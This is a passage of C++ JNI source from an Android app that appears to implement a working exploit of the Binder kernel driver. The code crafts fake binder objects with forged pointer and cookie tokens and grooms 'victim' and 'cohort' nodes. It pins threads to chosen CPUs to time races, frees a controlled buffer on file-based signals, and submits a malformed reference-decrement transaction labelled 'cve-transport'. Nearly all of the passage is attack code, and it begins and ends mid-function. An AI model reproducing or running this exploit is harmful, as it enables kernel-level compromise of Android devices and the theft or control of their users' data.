                acknowledgements.resize(command_offset +
                        sizeof(std::uint32_t) + sizeof(reference));
                write_command(acknowledgements.data() + command_offset,
                        response == BR_INCREFS
                                ? BC_INCREFS_DONE : BC_ACQUIRE_DONE,
                        &reference, sizeof(reference));
            } else if (response == BR_RELEASE) {
                ++releases;
            } else if (response == BR_DECREFS) {
                ++decrefs;
            } else if ((response == BR_TRANSACTION ||
                        response == BR_TRANSACTION_SEC_CTX) &&
                       payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data incoming {};
                std::memcpy(&incoming, read_buffer + offset,
                            sizeof(incoming));
                if (incoming.code == kControlledHoldCode) {
                    early_controlled = true;
                    break;
                }
                if (incoming.code == kRawCohortSettleCode &&
                        !(incoming.flags & TF_ONE_WAY)) {
                    marker_seen = true;
                    break;
                }
                ++unexpected_transactions;
            }
            offset += payload_size;
        }
        if (!acknowledgements.empty() &&
                write_binder_commands(fd, acknowledgements.data(),
                                      acknowledgements.size()) != 0) {
            acknowledgements_valid = false;
        }
        if (!acknowledgements_valid) {
            break;
        }
    }

    int cpu_before = sched_getcpu();
    int reply_written = -1;
    if (marker_seen && !early_controlled &&
            acknowledgements_valid && unexpected_transactions == 0 &&
            incref_tokens.size() == kRawCohortVictim &&
            acquire_tokens.size() == kRawCohortVictim &&
            releases == 0 && decrefs == 0 && cpu_before == 2) {
        std::int32_t reply_data[2] {0, 1};
        binder_transaction_data reply {};
        reply.data_size = sizeof(reply_data);
        reply.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
                reply_data);
        std::uint8_t command[sizeof(std::uint32_t) + sizeof(reply)] {};
        write_command(command, BC_REPLY, &reply, sizeof(reply));
        reply_written = write_binder_commands(
                fd, command, sizeof(command));
    }
    int cpu_after = sched_getcpu();
    bool pass = marker_seen && !early_controlled &&
            acknowledgements_valid && unexpected_transactions == 0 &&
            incref_tokens.size() == kRawCohortVictim &&
            acquire_tokens.size() == kRawCohortVictim &&
            releases == 0 && decrefs == 0 && reply_written == 0 &&
            cpu_before == 2 && cpu_after == 2;
    char state[320];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-cohort-settle marker=%d"
            " increfs=%d acquires=%d releases=%d decrefs=%d"
            " expected=%d ack_valid=%d"
            " early_controlled=%d unexpected_transactions=%d"
            " cpu_before=%d cpu_after=%d reply=%d",
            pass ? "pass" : "fail", marker_seen ? 1 : 0,
            increfs, acquires, releases, decrefs,
            kRawCohortVictim, acknowledgements_valid ? 1 : 0,
            early_controlled ? 1 : 0, unexpected_transactions,
            cpu_before, cpu_after, reply_written);
    write_text_file(directory + "/raw-cohort-settle.result", state);
    return pass;
}

bool reply_raw_export_victim_tail(int fd, const std::string& directory) {
    constexpr std::size_t kRecordSize =
            sizeof(flat_binder_object) + sizeof(std::int32_t);
    constexpr std::size_t kHeaderSize = 2 * sizeof(std::int32_t);
    constexpr int kReplyCount = 1 + kRawCohortTailCount;
    constexpr std::size_t kTokenSize = 2 * sizeof(std::uint64_t);
    std::vector<std::uint8_t> payload(
            kHeaderSize + kReplyCount * kRecordSize + kTokenSize);
    std::vector<binder_size_t> offsets(kReplyCount);
    std::int32_t count = kReplyCount;
    std::int32_t selected = kRawCohortVictim;
    std::int32_t stability = 12;
    std::memcpy(payload.data(), &count, sizeof(count));
    std::memcpy(payload.data() + sizeof(count), &selected,
                sizeof(selected));

    binder_uintptr_t selected_pointer = 0;
    binder_uintptr_t selected_cookie = 0;
    for (int slot = 0; slot < kReplyCount; ++slot) {
        int index = kRawCohortVictim + slot;
        if (index == kRawCohortVictim) {
            g_raw_export_binder_tokens[0] =
                    UINT64_C(0x5334c01100000000);
            g_raw_export_cookie_tokens[0] =
                    UINT64_C(0x4334c01100000000);
        } else {
            g_raw_cohort_binder_tokens[index] =
                    UINT64_C(0x5334c02100000000) |
                    static_cast<std::uint32_t>(index);
            g_raw_cohort_cookie_tokens[index] =
                    UINT64_C(0x4334c02100000000) |
                    static_cast<std::uint32_t>(index);
        }
        flat_binder_object object {};
        object.hdr.type = BINDER_TYPE_BINDER;
        object.flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
        object.binder = reinterpret_cast<binder_uintptr_t>(
                index == kRawCohortVictim
                        ? &g_raw_export_binder_tokens[0]
                        : &g_raw_cohort_binder_tokens[index]);
        object.cookie = reinterpret_cast<binder_uintptr_t>(
                index == kRawCohortVictim
                        ? &g_raw_export_cookie_tokens[0]
                        : &g_raw_cohort_cookie_tokens[index]);
        std::size_t record = kHeaderSize +
                static_cast<std::size_t>(slot) * kRecordSize;
        offsets[slot] = static_cast<binder_size_t>(record);
        std::memcpy(payload.data() + record, &object, sizeof(object));
        std::memcpy(payload.data() + record + sizeof(object), &stability,
                    sizeof(stability));
        if (index == kRawCohortVictim) {
            selected_pointer = object.binder;
            selected_cookie = object.cookie;
        }
    }
    std::size_t tokens = kHeaderSize + kReplyCount * kRecordSize;
    std::memcpy(payload.data() + tokens, &selected_pointer,
                sizeof(selected_pointer));
    std::memcpy(payload.data() + tokens + sizeof(selected_pointer),
                &selected_cookie, sizeof(selected_cookie));

    binder_transaction_data reply {};
    reply.data_size = payload.size();
    reply.offsets_size = offsets.size() * sizeof(offsets[0]);
    reply.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
            payload.data());
    reply.data.ptr.offsets = reinterpret_cast<binder_uintptr_t>(
            offsets.data());
    std::uint8_t command[sizeof(std::uint32_t) + sizeof(reply)] {};
    write_command(command, BC_REPLY, &reply, sizeof(reply));
    int cpu_before = sched_getcpu();
    int written = cpu_before == 2
            ? write_binder_commands(fd, command, sizeof(command)) : -1;
    int cpu_after = sched_getcpu();
    bool pass = written == 0 && cpu_before == 2 && cpu_after == 2 &&
            selected_pointer != 0 && selected_cookie != 0;
    char state[256];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-cohort-victim count=%d selected=%d"
            " tail=%d cpu_before=%d cpu_after=%d written=%d",
            pass ? "pass" : "fail", kReplyCount, kRawCohortVictim,
            kRawCohortTailCount, cpu_before, cpu_after, written);
    write_text_file(directory + "/raw-cohort-victim.result", state);
    return pass;
}

bool reply_raw_export(int fd, int index) {
    if (index < 0 || index >= kRawVictimCount) {
        return false;
    }
    g_raw_export_binder_tokens[index] =
            UINT64_C(0x5334c01100000000) |
            static_cast<std::uint32_t>(index);
    g_raw_export_cookie_tokens[index] =
            UINT64_C(0x4334c01100000000) |
            static_cast<std::uint32_t>(index);
    flat_binder_object raw_object {};
    raw_object.hdr.type = BINDER_TYPE_BINDER;
    raw_object.flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
    raw_object.binder = reinterpret_cast<binder_uintptr_t>(
            &g_raw_export_binder_tokens[index]);
    raw_object.cookie = reinterpret_cast<binder_uintptr_t>(
            &g_raw_export_cookie_tokens[index]);
    std::uint8_t export_payload[44] {};
    std::int32_t stability = 12;
    std::memcpy(export_payload, &raw_object, sizeof(raw_object));
    std::memcpy(export_payload + 24, &stability, sizeof(stability));
    std::memcpy(export_payload + 28, &raw_object.binder,
                sizeof(raw_object.binder));
    std::memcpy(export_payload + 36, &raw_object.cookie,
                sizeof(raw_object.cookie));
    binder_size_t export_offset = 0;
    binder_transaction_data reply {};
    reply.data_size = sizeof(export_payload);
    reply.offsets_size = sizeof(export_offset);
    reply.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
            export_payload);
    reply.data.ptr.offsets = reinterpret_cast<binder_uintptr_t>(
            &export_offset);
    std::uint8_t command[sizeof(std::uint32_t) + sizeof(reply)] {};
    write_command(command, BC_REPLY, &reply, sizeof(reply));
    return write_binder_commands(fd, command, sizeof(command)) == 0;
}

bool process_raw_controlled_victim(int fd, const std::string& directory,
                                   int victim, bool indexed) {
    std::string suffix = indexed ? "." + std::to_string(victim) : "";
    write_text_file(directory + "/raw-target.reading" + suffix,
            "status=ready polling=1 timeout_ms=20000");
    binder_uintptr_t controlled_buffer = 0;
    std::uint64_t controlled_ptr = 0;
    std::uint64_t controlled_cookie = 0;
    int read_calls = 0;
    int responses = 0;
    int transactions = 0;
    std::uint32_t last_response = 0;
    std::uint32_t last_code = 0;
    std::uint32_t last_flags = 0;
    binder_size_t last_data_size = 0;
    binder_size_t last_offsets_size = 0;
    std::uint32_t response_order[8] {};
    int response_reads[8] {};
    int response_order_count = 0;
    int refs_before_transaction = 0;
    int victim_refs_before_transaction = 0;
    int victim_ref_count = 0;
    std::uint64_t last_ref_ptr = 0;
    std::uint64_t last_ref_cookie = 0;
    bool controlled_seen = false;
    for (int attempt = 0;
         attempt < 20 && controlled_buffer == 0; ++attempt) {
        pollfd descriptor {fd, POLLIN, 0};
        int poll_result = poll(&descriptor, 1, 1000);
        if (poll_result <= 0 || !(descriptor.revents & POLLIN)) {
            continue;
        }
        std::uint8_t read_buffer[128] {};
        binder_write_read request {};
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            if (errno == EINTR) {
                continue;
            }
            break;
        }
        ++read_calls;
        for (std::size_t offset = 0;
             offset + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + offset, sizeof(response));
            last_response = response;
            ++responses;
            if (response_order_count < 8) {
                response_order[response_order_count] = response;
                response_reads[response_order_count] = read_calls;
                ++response_order_count;
            }
            offset += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (offset + payload_size > request.read_consumed) {
                break;
            }
            if ((response == BR_TRANSACTION ||
                 response == BR_TRANSACTION_SEC_CTX) &&
                payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data transaction {};
                std::memcpy(&transaction, read_buffer + offset,
                            sizeof(transaction));
                last_code = transaction.code;
                ++transactions;
                if (transaction.code == kControlledHoldCode) {
                    controlled_seen = true;
                    controlled_buffer = transaction.data.ptr.buffer;
                    controlled_ptr = transaction.target.ptr;
                    controlled_cookie = transaction.cookie;
                    last_flags = transaction.flags;
                    last_data_size = transaction.data_size;
                    last_offsets_size = transaction.offsets_size;
                    break;
                }
            } else if ((response == BR_INCREFS ||
                        response == BR_ACQUIRE ||
                        response == BR_RELEASE ||
                        response == BR_DECREFS) &&
                       payload_size >= sizeof(binder_ptr_cookie)) {
                binder_ptr_cookie reference {};
                std::memcpy(&reference, read_buffer + offset,
                            sizeof(reference));
                int bit = response == BR_RELEASE ? 1 :
                        response == BR_DECREFS ? 2 :
                        response == BR_ACQUIRE ? 4 : 8;
                if (!controlled_seen) {
                    refs_before_transaction |= bit;
                    std::uint64_t victim_ptr =
                            reinterpret_cast<std::uint64_t>(
                                    &g_raw_export_binder_tokens[victim]);
                    std::uint64_t victim_cookie =
                            reinterpret_cast<std::uint64_t>(
                                    &g_raw_export_cookie_tokens[victim]);
                    if (reference.ptr == victim_ptr &&
                            reference.cookie == victim_cookie) {
                        victim_refs_before_transaction |= bit;
                        ++victim_ref_count;
                    }
                }
                last_ref_ptr = reference.ptr;
                last_ref_cookie = reference.cookie;
            }
            offset += payload_size;
        }
    }
    int worker = -1;
    int raw_index = -1;
    bool exact_payload = controlled_buffer != 0;
    if (indexed) {
        raw_index = static_cast<int>(
                controlled_ptr & kFakeControlIndexMask);
        exact_payload = exact_payload &&
                (controlled_ptr & ~kFakeControlIndexMask) == kIndexedPtrBase &&
                (controlled_cookie & ~kFakeControlIndexMask) ==
                        kIndexedCookieBase &&
                static_cast<int>(
                        controlled_cookie & kFakeControlIndexMask) ==
                        raw_index;
        if (exact_payload) {
            worker = raw_index;
        }
    } else {
        exact_payload = exact_payload &&
                controlled_ptr == kFakePtrMarker &&
                controlled_cookie == kFakeCookieMarker;
    }
    cpu_set_t wait_set;
    CPU_ZERO(&wait_set);
    CPU_SET(1, &wait_set);
    bool wait_pinned = !exact_payload ||
            sched_setaffinity(0, sizeof(wait_set), &wait_set) == 0;
    bool ready = exact_payload && wait_pinned;
    char state[2048];
    std::snprintf(state, sizeof(state),
            "status=%s stage=fake-node-check victim=%d"
            " buffer=0x%" PRIx64 " ptr=0x%" PRIx64
            " cookie=0x%" PRIx64 " worker_index=%d raw_index=%d"
            " exact_payload=%d buffer_freed=0 polling=1 wait_cpu=%d"
            " read_calls=%d responses=%d transactions=%d"
            " last_response=0x%x last_code=0x%x flags=0x%x"
            " data_size=%" PRIu64 " offsets_size=%" PRIu64
            " refs_before_transaction=0x%x"
            " victim_refs_before_transaction=0x%x victim_ref_count=%d"
            " last_ref_ptr=0x%" PRIx64
            " last_ref_cookie=0x%" PRIx64
            " order=%d:0x%x,%d:0x%x,%d:0x%x,%d:0x%x,"
            "%d:0x%x,%d:0x%x,%d:0x%x,%d:0x%x",
            ready ? "ready" : "miss", victim,
            static_cast<std::uint64_t>(controlled_buffer),
            controlled_ptr, controlled_cookie, worker, raw_index,
            exact_payload ? 1 : 0, wait_pinned ? 1 : 0,
            read_calls, responses,
            transactions, last_response, last_code,
            last_flags, static_cast<std::uint64_t>(last_data_size),
            static_cast<std::uint64_t>(last_offsets_size),
            refs_before_transaction, victim_refs_before_transaction,
            victim_ref_count, last_ref_ptr, last_ref_cookie,
            response_reads[0], response_order[0],
            response_reads[1], response_order[1],
            response_reads[2], response_order[2],
            response_reads[3], response_order[3],
            response_reads[4], response_order[4],
            response_reads[5], response_order[5],
            response_reads[6], response_order[6],
            response_reads[7], response_order[7]);
    write_text_file(directory + "/controlled-reader.result" + suffix,
                    state);
    if (!exact_payload) {
        return false;
    }
    if (!wait_pinned) {
        park_current_thread();
    }
    const std::string free_gate =
            directory + "/controlled-free.enable" + suffix;
    while (!wait_for_file_byte(free_gate, '1', 150000)) {
    }
    cpu_set_t free_set;
    CPU_ZERO(&free_set);
    CPU_SET(2, &free_set);
    if (sched_setaffinity(0, sizeof(free_set), &free_set) != 0) {
        park_current_thread();
    }
    if (!free_buffer(fd, controlled_buffer)) {
        park_current_thread();
    }
    if (!write_text_file(directory + "/controlled-free.result" + suffix,
                         "status=pass stage=fake-node-check buffer_freed=1")) {
        park_current_thread();
    }
    return true;
}

void run_deferred_raw_export(std::string directory, int slot) {
    std::string slot_suffix = "." + std::to_string(slot);
    if (!write_text_file(
                directory + "/raw-extra-export.thread-ready" + slot_suffix,
                "status=ready stage=raw-extra-export-thread") ||
        !wait_for_file(directory + "/raw-extra-export.looper-go", 120000)) {
        return;
    }
    int fd = duplicate_binder_fd();
    std::uint32_t enter = BC_ENTER_LOOPER;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    if (fd < 0 || write_binder_commands(fd, &enter, sizeof(enter)) != 0 ||
        sched_setaffinity(0, sizeof(set), &set) != 0 ||
        !write_text_file(directory + "/raw-extra-export.ready" + slot_suffix,
                         "status=ready stage=raw-extra-export")) {
        if (fd >= 0) {
            close(fd);
        }
        return;
    }
    auto receive_export_request = [&]() {
    while (true) {
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            return -1;
        }
        for (std::size_t offset = 0;
             offset + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + offset, sizeof(response));
            offset += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (offset + payload_size > request.read_consumed) {
                break;
            }
            if ((response == BR_TRANSACTION ||
                 response == BR_TRANSACTION_SEC_CTX) &&
                payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data incoming {};
                std::memcpy(&incoming, read_buffer + offset,
                            sizeof(incoming));
                int victim = static_cast<int>(incoming.code) -
                        static_cast<int>(kControlledExportCode);
                if (victim > 0 && victim < kRawVictimCount &&
                    !(incoming.flags & TF_ONE_WAY)) {
                    return victim;
                }
            }
            offset += payload_size;
        }
    }
    };
    int victim = receive_export_request();
    bool freed = victim > 0 && wait_for_file(
            directory + "/controlled-free.result.0", 120000);
    bool replied = freed && wait_for_file_byte(
            directory + "/raw-extra-export.reply-signal", '1', 120000) &&
            reply_raw_export(fd, victim);
    bool completed = replied && wait_for_file(
            directory + "/controlled-read.enable." +
                    std::to_string(victim), 120000) &&
            process_raw_controlled_victim(fd, directory, victim, true);
    write_text_file(directory + "/raw-extra-export.target-result." +
                            std::to_string(victim),
            completed ? "status=pass stage=raw-extra-export"
                      : "status=fail stage=raw-extra-export");
    close(fd);
}

bool canonical_boot_id(const std::string& value) {
    if (value.size() != 36) {
        return false;
    }
    for (std::size_t index = 0; index < value.size(); ++index) {
        if (index == 8 || index == 13 || index == 18 || index == 23) {
            if (value[index] != '-') {
                return false;
            }
        } else if (!((value[index] >= '0' && value[index] <= '9') ||
                     (value[index] >= 'a' && value[index] <= 'f'))) {
            return false;
        }
    }
    return true;
}

void run_raw_target_owner(std::string directory, std::string nonce,
                          std::string expected_boot_id,
                          std::uint64_t target_start_time,
                          bool terminal_cleanup) {
    const std::string target_result = directory + "/raw-target.result";
    auto finish = [&](const std::string& state) {
        write_text_file(target_result, state);
        g_raw_target_armed.store(false);
    };
    if (!wait_for_file(directory + "/raw-target.start", 12000)) {
        finish("status=fail stage=raw-target reason=start-timeout");
        return;
    }
    int fd = duplicate_binder_fd();
    if (fd < 0) {
        finish("status=fail stage=raw-target reason=binder");
        return;
    }
    std::uint32_t enter = BC_ENTER_LOOPER;
    if (write_binder_commands(fd, &enter, sizeof(enter)) != 0 ||
        !pin_current_thread_to_cpu(2) ||
        !write_text_file(directory + "/controlled-export.ready",
                         "status=ready stage=raw-controlled-export")) {
        close(fd);
        finish("status=fail stage=raw-target reason=looper");
        return;
    }

    int export_limit = access(
            (directory + "/raw-target.multi-export").c_str(), F_OK) == 0
            ? kRawVictimCount : 1;
    bool cohort_export = export_limit > 1;
    bool deferred_export = access(
            (directory + "/raw-target.deferred-export").c_str(), F_OK) == 0;
    int exported = 0;
    auto export_until = [&](int desired) {
    while (exported < desired) {
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            break;
        }
        for (std::size_t offset = 0;
             offset + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + offset, sizeof(response));
            offset += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (offset + payload_size > request.read_consumed) {
                break;
            }
            if ((response == BR_TRANSACTION ||
                 response == BR_TRANSACTION_SEC_CTX) &&
                payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data incoming {};
                std::memcpy(&incoming, read_buffer + offset,
                            sizeof(incoming));
                if (incoming.code == kControlledExportCode &&
                    !(incoming.flags & TF_ONE_WAY)) {
                    int index = exported;
                    bool replied = index == 0 && cohort_export
                            ? reply_raw_export_cohort(fd, directory)
                            : index == 1 && cohort_export
                                    ? reply_raw_export_victim_tail(
                                            fd, directory)
                            : reply_raw_export(fd, index);
                    if (replied) {
                        ++exported;
                    }
                    break;
                }
            }
            offset += payload_size;
        }
    }
    return exported == desired;
    };
    if (!export_until(1)) {
        close(fd);
        finish("status=fail stage=raw-target reason=export");
        return;
    }
    if (cohort_export && !settle_raw_export_cohort(fd, directory)) {
        close(fd);
        finish("status=fail stage=raw-target reason=cohort-settle");
        return;
    }
    if (cohort_export && !export_until(2)) {
        close(fd);
        finish("status=fail stage=raw-target reason=victim-export");
        return;
    }
    if (cohort_export) {
        int migration_errno = 0;
        int observed_cpu = -1;
        if (!pin_current_thread_to_cpu(
                    1, &migration_errno, &observed_cpu)) {
            close(fd);
            char state[192];
            std::snprintf(state, sizeof(state),
                    "status=fail stage=raw-target reason=wait-cpu"
                    " errno=%d observed_cpu=%d",
                    migration_errno, observed_cpu);
            finish(state);
            return;
        }
        if (!write_text_file(directory + "/raw-cohort.ready",
                "status=ready stage=raw-cohort-owner cpu=1")) {
            close(fd);
            finish("status=fail stage=raw-target reason=ready-marker");
            return;
        }
    }
    bool multi = false;
    bool enabled = false;
    for (int attempt = 0; attempt < 12000; ++attempt) {
        if (access((directory + "/controlled-read.enable.0").c_str(),
                   F_OK) == 0) {
            multi = true;
            enabled = true;
            break;
        }
        if (!cohort_export &&
            access((directory + "/controlled-read.enable").c_str(),
                   F_OK) == 0) {
            enabled = true;
            break;
        }
        usleep(10000);
    }
    if (!enabled) {
        if (cohort_export) {
            park_current_thread();
        }
        close(fd);
        finish("status=fail stage=raw-target reason=read-timeout");
        return;
    }
    if (cohort_export) {
        int migration_errno = 0;
        int observed_cpu = -1;
        if (!pin_current_thread_to_cpu(
                    2, &migration_errno, &observed_cpu)) {
            close(fd);
            char state[192];
            std::snprintf(state, sizeof(state),
                    "status=fail stage=raw-target reason=read-cpu"
                    " errno=%d observed_cpu=%d",
                    migration_errno, observed_cpu);
            finish(state);
            return;
        }
    }
    if (!process_raw_controlled_victim(fd, directory, 0, multi)) {
        close(fd);
        finish("status=fail stage=raw-target reason=free-timeout");
        return;
    }
    if (deferred_export && wait_for_file(
            directory + "/raw-extra-export.receivers-go", 120000)) {
        for (int slot = 0; slot < kRawVictimCount - 1; ++slot) {
            std::thread(run_deferred_raw_export,
                        directory, slot).detach();
        }
    }
    close(fd);
    if (!terminal_cleanup) {
        finish("status=pass stage=raw-target finished=1");
        return;
    }
    if (!write_text_file(target_result,
            "status=pass stage=raw-target finished=1")) {
        syscall(SYS_exit_group, 1);
        return;
    }

    const std::string retirement_path = directory + "/raw-target.retire";
    const std::string retirement_result =
            directory + "/raw-target.retirement.result";
    bool signal_seen = false;
    for (int attempt = 0; attempt < 24000; ++attempt) {
        if (access(retirement_path.c_str(), F_OK) == 0) {
            signal_seen = true;
            break;
        }
        usleep(10000);
    }
    std::map<std::string, std::string> fields;
    std::string current_boot_id = read_text_file(
            "/proc/sys/kernel/random/boot_id");
    while (!current_boot_id.empty() &&
           (current_boot_id.back() == '\n' ||
            current_boot_id.back() == '\r')) {
        current_boot_id.pop_back();
    }
    bool valid = signal_seen && nonce.size() == 32 &&
            lower_hex_digits(nonce) &&
            canonical_boot_id(expected_boot_id) &&
            current_boot_id == expected_boot_id &&
            target_start_time > 0 && parse_ordered_record(
                    read_text_file(retirement_path),
                    {"nonce", "target_pid", "target_start_time",
                     "boot_id", "host_helper_retired"}, &fields) &&
            fields["nonce"] == nonce &&
            fields["target_pid"] == std::to_string(getpid()) &&
            fields["target_start_time"] ==
                    std::to_string(target_start_time) &&
            fields["boot_id"] == expected_boot_id &&
            fields["host_helper_retired"] == "1";
    char state[384];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-target-retirement"
            " nonce=%s target_pid=%d target_start_time=%" PRIu64
            " boot_id=%s self_exit=%d",
            valid ? "pass" : "fail", nonce.c_str(), getpid(),
            target_start_time, expected_boot_id.c_str(), valid ? 1 : 0);
    write_text_file(retirement_result, state);
    syscall(SYS_exit_group, valid ? 0 : 1);
    for (;;) {
        pause();
    }
}

}  // namespace

bool collect_terminal_ctlbuf_slots(
        std::vector<const FakeControlSlot*>* selected);

extern "C" JNIEXPORT jlongArray JNICALL
Java_com_vandam_prism_NativeBridge_ownerTokens(JNIEnv* environment,
                                                    jclass,
                                                    jobject binder) {
    jlong values[2] {0, 0};
    jclass binder_class = environment->FindClass("android/os/Binder");
    if (binder != nullptr && binder_class != nullptr) {
        jfieldID object_field = environment->GetFieldID(
                binder_class, "mObject", "J");
        if (object_field != nullptr) {
            jlong holder = environment->GetLongField(binder, object_field);
            if (holder != 0) {
                const auto* data = reinterpret_cast<const std::uint8_t*>(
                        static_cast<std::uintptr_t>(holder));
                std::memcpy(&values[1], data + 0x28, sizeof(values[1]));
                std::memcpy(&values[0], data + 0x30, sizeof(values[0]));
            }
        }
    }
    jlongArray result = environment->NewLongArray(2);
    if (result != nullptr) {
        environment->SetLongArrayRegion(result, 0, 2, values);
    }
    return result;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_bootstrap(JNIEnv* environment, jclass,
                                                  jlong owner_pointer,
                                                  jlong owner_cookie) {
    int fd = duplicate_binder_fd();
    int handle = fd >= 0 ? locate_owner(fd) : -1;
    binder_version version {};
    int version_result = fd >= 0 ? ioctl(fd, BINDER_VERSION, &version) : -1;
    bool pass = fd >= 0 && handle > 0 && owner_pointer != 0 &&
                owner_cookie != 0 && version_result == 0 &&
                version.protocol_version == 8;
    char state[320];
    std::snprintf(state, sizeof(state),
                  "status=%s stage=bootstrap handle=%d ptr=0x%" PRIx64
                  " cookie=0x%" PRIx64 " binder_version=%d",
                  pass ? "pass" : "fail", handle,
                  static_cast<std::uint64_t>(owner_pointer),
                  static_cast<std::uint64_t>(owner_cookie),
                  version.protocol_version);
    if (fd >= 0) {
        close(fd);
    }
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_cveTransport(
        JNIEnv* environment, jclass, jlong owner_pointer,
        jlong owner_cookie) {
    int fd = duplicate_binder_fd();
    int handle = fd >= 0 ? locate_owner(fd) : -1;
    CveResult result;
    if (fd >= 0 && handle > 0 && owner_pointer != 0 && owner_cookie != 0) {
        result = send_single_decrement(
                fd, handle, static_cast<binder_uintptr_t>(owner_pointer),
                static_cast<binder_uintptr_t>(owner_cookie));
    }
    bool pass = fd >= 0 && handle > 0 && result.ioctl_result == 0 &&
                result.failed_reply && !result.dead_reply;
    char state[640];
    std::snprintf(state, sizeof(state),
                  "status=%s stage=cve-transport handle=%d held=1"
                  " ioctl=%d errno=%d failed_reply=%d complete=%d"
                  " dead_reply=%d malformed_submitted=1",
                  pass ? "pass" : "fail", handle, result.ioctl_result,
                  result.ioctl_errno, result.failed_reply ? 1 : 0,
                  result.transaction_complete ? 1 : 0,
                  result.dead_reply ? 1 : 0);
    if (fd >= 0) {
        close(fd);
    }
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jint JNICALL
Java_com_vandam_prism_NativeBridge_pinCurrentThread(JNIEnv*, jclass,
                                                        jint cpu) {
    if (!pin_current_thread_to_cpu(cpu)) {
        return -1;
    }
    return sched_getcpu();
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_validateCohort(
        JNIEnv* environment, jclass, jobject calibration,
        jobjectArray binder_array,
        jlongArray pointer_array, jlongArray cookie_array, jint owner_cpu) {
    jsize pointer_count = environment->GetArrayLength(pointer_array);
    jsize cookie_count = environment->GetArrayLength(cookie_array);
    std::set<std::uint64_t> pointers;
    std::set<std::uint64_t> cookies;
    std::uint64_t first_pointer = 0;
    std::uint64_t first_cookie = 0;
    bool nonzero = pointer_count == kCohortSize &&
            cookie_count == kCohortSize;
    if (nonzero) {
        jlong* pointer_values = environment->GetLongArrayElements(
                pointer_array, nullptr);
        jlong* cookie_values = environment->GetLongArrayElements(
                cookie_array, nullptr);
        for (jsize index = 0; index < pointer_count; ++index) {
            if (index == 0) {
                first_pointer = static_cast<std::uint64_t>(
                        pointer_values[index]);
                first_cookie = static_cast<std::uint64_t>(
                        cookie_values[index]);
            }
            nonzero &= pointer_values[index] != 0 && cookie_values[index] != 0;
            pointers.insert(static_cast<std::uint64_t>(pointer_values[index]));
            cookies.insert(static_cast<std::uint64_t>(cookie_values[index]));
        }
        environment->ReleaseLongArrayElements(pointer_array, pointer_values,
                                              JNI_ABORT);
        environment->ReleaseLongArrayElements(cookie_array, cookie_values,
                                              JNI_ABORT);
    }

    int first_handle = -1;
    int last_handle = -1;
    std::size_t object_slot = 0;
    std::ptrdiff_t handle_offset = 0;
    bool handles_extracted = binder_array != nullptr &&
            environment->GetArrayLength(binder_array) == kCohortSize &&
            extract_cohort_handles(environment, calibration, binder_array,
                    &first_handle, &last_handle, &object_slot,
                    &handle_offset);
    int handles = handles_extracted ? kCohortSize : 0;
    int selected_handle = handles_extracted
            ? g_cohort_handles[kSelectedIndex] : -1;
    g_cohort_handles_ready = handles_extracted;
    bool pass = nonzero && pointers.size() == kCohortSize &&
                cookies.size() == kCohortSize &&
                handles == kCohortSize && selected_handle > 0 &&
                owner_cpu == 6;
    char state[384];
    std::snprintf(state, sizeof(state),
                  "status=%s stage=cohort nodes=%d unique_ptrs=%zu"
                  " unique_cookies=%zu handles=%d first_handle=%d"
                  " last_handle=%d selected_index=%d selected_handle=%d"
                  " owner_cpu=%d nonzero=%d first_ptr=0x%" PRIx64
                  " first_cookie=0x%" PRIx64
                  " proxy_slot=%zu handle_delta=%td"
                  " calibration_handle=%d selected_queried=0"
                  " top_adjust=%td handle_kind=%d"
                  " wrapper_offset=%zu"
                  " native=0x%" PRIx64 " words=0x%" PRIx64
                  ",0x%" PRIx64 ",0x%" PRIx64 ",0x%" PRIx64
                  " malformed_submitted=0",
                  pass ? "pass" : "fail", pointer_count, pointers.size(),
                  cookies.size(), handles, first_handle, last_handle,
                  kSelectedIndex, selected_handle, owner_cpu,
                  nonzero ? 1 : 0,
                  first_pointer, first_cookie, object_slot, handle_offset,
                  g_calibration_handle, g_top_adjust, g_handle_kind,
                  g_wrapper_offset, g_proxy_native_data,
                  g_proxy_words[0], g_proxy_words[1],
                  g_proxy_words[2], g_proxy_words[3]);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_adoptAndQueueCohort(
        JNIEnv* environment, jclass, jobjectArray binder_array,
        jlongArray pointer_array, jlongArray cookie_array, jint owner_cpu) {
    if (g_cohort_ready ||
        environment->GetArrayLength(binder_array) != kCohortSize ||
        environment->GetArrayLength(pointer_array) != kCohortSize ||
